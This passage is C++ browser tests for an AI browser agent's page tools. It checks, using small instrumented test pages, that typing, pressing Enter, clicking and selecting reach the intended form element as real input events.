// input channels; WebContents::Focus(); an inactive browser window; and reading
// the browser-side tree instead of a renderer snapshot (that one returns
// something AXTree::Unserialize rejects outright -- see the comment in
// zephyrus_agent_tool_surface.cc).
//
// The fix that followed: synthesise a real mouse press at the element's bounds
// instead of asking accessibility to focus it. Not another go at the same
// mechanism -- a pointer travels Blink's ordinary input pipeline, which is
// already known to work here, since `dockey:Enter` proves keys arrive. It is
// also how a person focuses a field.
//
// This test therefore also stands guard over the bounds themselves. If an
// Observation reported empty bounds, or wrongly called a visible field
// offscreen, the click would be skipped and the focus expectation below would
// fail -- which is the only cheap way to know those numbers can be trusted.
//
// The page records every relevant event into its own title, so a failure says
// exactly what reached it rather than leaving it to be guessed at. Three
// hypotheses about this were wrong in a row -- ordering, then AX focus, then
// browser focus -- which is what instrumenting instead of theorising is for.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest,
                       TypingFocusesSoEnterReachesTheField) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>start</title>"
           "<input aria-label='Search'>"
           "<script>"
           "var seen=[];"
           "function note(s){seen.push(s);document.title=seen.join('|');}"
           "document.addEventListener('focusin',function(e){"
           "note('focus:'+e.target.tagName);});"
           "document.querySelector('input').addEventListener('input',"
           "function(e){note('value:'+e.target.value);});"
           "document.querySelector('input').addEventListener('keydown',"
           "function(e){note('inputkey:'+e.key);});"
           "document.addEventListener('keydown',function(e){"
           "note('dockey:'+e.key);});"
           "</script>")));

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, "Search for sidemen",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  auto settle = [&] {
    base::RunLoop delay;
    base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
        FROM_HERE, delay.QuitClosure(), base::Milliseconds(150));
    delay.Run();
  };

  ToolExecutor::Result seen = run("page.observe", R"({"level":1})");
  ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk);
  const std::string field = IdForName(seen.value_json, "Search");
  ASSERT_FALSE(field.empty()) << seen.value_json;

  ASSERT_EQ(run("page.type",
                R"({"element_id":")" + field + R"(","text":"sidemen"})")
                .status,
            ToolExecutor::Result::Status::kOk);
  settle();

  const std::string after_typing =
      run("page.observe", R"({"level":1})").value_json;

  ASSERT_EQ(run("page.press", R"({"key":"Enter"})").status,
            ToolExecutor::Result::Status::kOk);
  settle();

  const std::string after_enter =
      run("page.observe", R"({"level":0})").value_json;

  // What the page itself recorded. Each of these is a separate claim, so a
  // failure names which link in the chain broke rather than just "it did not
  // work".
  EXPECT_NE(after_typing.find("value:sidemen"), std::string::npos)
      << "the input event never fired.\nafter typing: " << after_typing;
  // Ask the accessibility tree what is focused, rather than relying on the
  // page's event. The two answers separate "focus never happened" from "focus
  // happened and the event did not fire", which no amount of reasoning from
  // outside was going to settle.
  EXPECT_NE(after_typing.find("\"focused\":true"), std::string::npos)
      << "the tree says nothing is focused. window active: "
      << browser()->window()->IsActive()
      << "\nafter typing: " << after_typing;
  EXPECT_NE(after_enter.find("inputkey:Enter"), std::string::npos)
      << "Enter did not reach the field.\nafter enter: " << after_enter;

  // The page must see REAL KEYSTROKES, not an assigned value.
  //
  // This is the difference that matters on a real site. kSetValue writes
  // the value and fires `input`, but no `keydown` ever happens -- and a
  // search box built as a framework component (YouTube's is) decides
  // whether it has content by watching its own events, not by reading
  // .value. So it stays convinced it is empty, refuses to submit, and the
  // Observation keeps reporting "currently empty" after every fill.
  // Measured on youtube.com, which is what sent this back for a third go.
  //
  // A page cannot tell a synthesised keystroke from a typed one, which is
  // the point of going through the input pipeline rather than asking the
  // accessibility layer to set a field for us.
  EXPECT_NE(after_typing.find("inputkey:s"), std::string::npos)
      << "the field never saw a keystroke, only a value.\nafter typing: "
      << after_typing;
}

// WHERE does the synthesised click actually land?
//
// Written because a real run on youtube.com selected the ENTIRE PAGE blue --
// the Ctrl+A that is meant to select a field's contents went to the document
// instead, which can only mean the click never focused the field. The existing
// focus test could not catch that: its input sits at the top-left of a bare
// page, where almost any coordinate error still lands on it.
//
// So this one puts the field a long way from the origin, in both axes, and has
// the page report the coordinates it actually received. A failure prints the
// aimed-at point next to the landed-on point, which turns "the click missed"
// into a number -- an offset, a scale factor, or neither.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest,
                       ClickLandsOnTheElementNotNearIt) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>start</title>"
           "<body style='margin:0'>"
           "<div style='height:320px'></div>"
           "<div style='margin-left:430px'>"
           "<input aria-label='Search' style='width:240px;height:44px'>"
           "</div>"
           "<script>"
           "var seen=[];"
           "function note(s){seen.push(s);document.title=seen.join('|');}"
           "document.addEventListener('click',function(e){"
           "note('click:'+Math.round(e.clientX)+','+Math.round(e.clientY)"
           "+':'+e.target.tagName);});"
           "document.addEventListener('focusin',function(e){"
           "note('focus:'+e.target.tagName);});"
           "document.querySelector('input').addEventListener('input',"
           "function(e){note('value:'+e.target.value);});"
           "</script>")));

  // Where the page itself says the field is. The click should land inside this.
  const int want_x =
      content::EvalJs(browser()->tab_strip_model()->GetActiveWebContents(),
                      "Math.round(document.querySelector('input')"
                      ".getBoundingClientRect().left + 120)")
          .ExtractInt();
  const int want_y =
      content::EvalJs(browser()->tab_strip_model()->GetActiveWebContents(),
                      "Math.round(document.querySelector('input')"
                      ".getBoundingClientRect().top + 22)")
          .ExtractInt();

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, "Search for sidemen",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  ToolExecutor::Result seen = run("page.observe", R"({"level":1})");
  ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk);
  const std::string field = IdForName(seen.value_json, "Search");
  ASSERT_FALSE(field.empty()) << seen.value_json;

  ASSERT_EQ(run("page.type",
                R"({"element_id":")" + field + R"(","text":"sidemen"})")
                .status,
            ToolExecutor::Result::Status::kOk);

  base::RunLoop delay;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, delay.QuitClosure(), base::Milliseconds(250));
  delay.Run();

  const std::string after = run("page.observe", R"({"level":1})").value_json;

  // The click has to have hit the INPUT itself. Landing on BODY or a wrapper
  // div is the real-world failure, and it is silent without this.
  EXPECT_NE(after.find(":INPUT"), std::string::npos)
      << "the click did not land on the field. aimed at roughly " << want_x
      << "," << want_y << " (page coordinates). what the page saw: " << after;
  EXPECT_NE(after.find("focus:INPUT"), std::string::npos)
      << "the field never took focus. after: " << after;
  EXPECT_NE(after.find("value:sidemen"), std::string::npos)
      << "the text never landed. after: " << after;
}

// page.select must choose the named option, on the right element.
//
// It used to address the node by id, and an Observation's ids are counters
// invented by ui::AXTreeCombiner rather than the renderer's node ids -- so it
// could set a value on an unrelated element and report success. It now clicks
// by coordinates and types, like the other two element actions.
//
// This test is what decides whether that is enough. A <select> matches options
// by typed prefix and commits on Enter, but Chromium opens its own popup for
// one and whether synthesised keys reach that popup is a platform question. If
// this fails, the answer is not to fiddle with the keystrokes: it is to make
// page.select refuse and tell the model to click the control, look, and click
// the option -- which uses only mechanisms already proven here.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest,
                       SelectingChoosesTheOptionByName) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>start</title>"
           "<body style='margin:0'>"
           "<div style='height:240px'></div>"
           "<div style='margin-left:360px'>"
           "<select aria-label='Country'>"
           "<option>Australia</option>"
           "<option>Brazil</option>"
           "<option>India</option>"
           "</select></div>"
           "<script>"
           "var seen=[];"
           "function note(s){seen.push(s);document.title=seen.join('|');}"
           "document.querySelector('select').addEventListener('change',"
           "function(e){note('chose:'+e.target.value);});"
           "</script>")));

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, "Pick a country",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  ToolExecutor::Result seen = run("page.observe", R"({"level":1})");
  ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk);
  const std::string control = IdForName(seen.value_json, "Country");
  ASSERT_FALSE(control.empty()) << seen.value_json;

  ASSERT_EQ(run("page.select",
                R"({"element_id":")" + control + R"(","value":"India"})")
                .status,
            ToolExecutor::Result::Status::kOk);

  base::RunLoop delay;
  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
      FROM_HERE, delay.QuitClosure(), base::Milliseconds(400));
  delay.Run();

  const std::string after = run("page.observe", R"({"level":1})").value_json;
  EXPECT_NE(after.find("chose:India"), std::string::npos)
      << "the option was not chosen. what the page saw: " << after;
}

}  // namespace
}  // namespace zephyrus::agent
